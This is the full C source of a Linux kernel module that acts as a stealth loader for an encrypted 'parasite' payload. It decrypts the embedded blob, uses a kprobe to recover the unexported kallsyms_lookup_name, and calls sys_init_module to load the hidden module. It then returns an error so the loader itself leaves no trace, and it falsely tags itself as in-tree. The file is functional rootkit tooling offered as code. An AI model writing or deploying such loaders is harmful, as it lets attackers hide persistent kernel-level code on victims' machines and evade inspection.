#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/mman.h>

#ifdef CONFIG_KPROBES
# include <linux/kprobes.h>
#endif

#include "encrypt/encrypt.h"

static char parasite_blob[] = {
# include "parasite_blob.inc"
};

static long lookupName = 0;
module_param(lookupName, long, 0);

// kernel module loader STB_WEAK binding hack
extern __attribute__((weak)) unsigned long kallsyms_lookup_name(const char *);

unsigned long ksym_lookup_name(const char *name)
{
	static typeof(ksym_lookup_name) *lookup_name = kallsyms_lookup_name;
#ifdef CONFIG_KPROBES
	if (NULL == lookup_name) {
		struct kprobe probe;
		int callback(struct kprobe *p, struct pt_regs *regs) {
			return 0;
		}
		memset(&probe, 0, sizeof(probe));
		probe.pre_handler = callback;
		probe.symbol_name = "kallsyms_lookup_name";
		if (!register_kprobe(&probe)) {
			lookup_name = (void *)probe.addr;
			unregister_kprobe(&probe);
		}
	}
#endif
	if (NULL == lookup_name)
		lookup_name = (void *)lookupName;
	return lookup_name ? lookup_name(name) : 0;
}

int init_module(void)
{
	asmlinkage long (*sys_init_module)(const void *, unsigned long, const char *) = NULL;

	printk("%s is saying:\n"
	       "Hello, I'm the loader.\n"
	       "I will load the parasite for you.\n", KBUILD_MODNAME);

	do_decrypt(parasite_blob, sizeof(parasite_blob), DECRYPT_KEY);

	sys_init_module = (void *)ksym_lookup_name("sys_init_module");
	if (!sys_init_module) {
		sys_init_module = (void *)ksym_lookup_name("__do_sys_init_module");
		if (!sys_init_module) {
			printk("No `[__do_]sys_init_module` found\n");
			return -EINVAL;
		}
	}

	if (sys_init_module) {
		const size_t len = roundup(sizeof(parasite_blob), PAGE_SIZE);
		void *map = (void *)vm_mmap(NULL, 0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, 0);
		if (map) {
			copy_to_user(map, parasite_blob, sizeof(parasite_blob));
			sys_init_module(map, sizeof(parasite_blob), map + sizeof(parasite_blob));
			vm_munmap((unsigned long)map, len);
		}
	}

	return -EINVAL;
}

MODULE_LICENSE("GPL");
MODULE_INFO(intree, "Y");
MODULE_AUTHOR("Ilya V. Matveychikov");
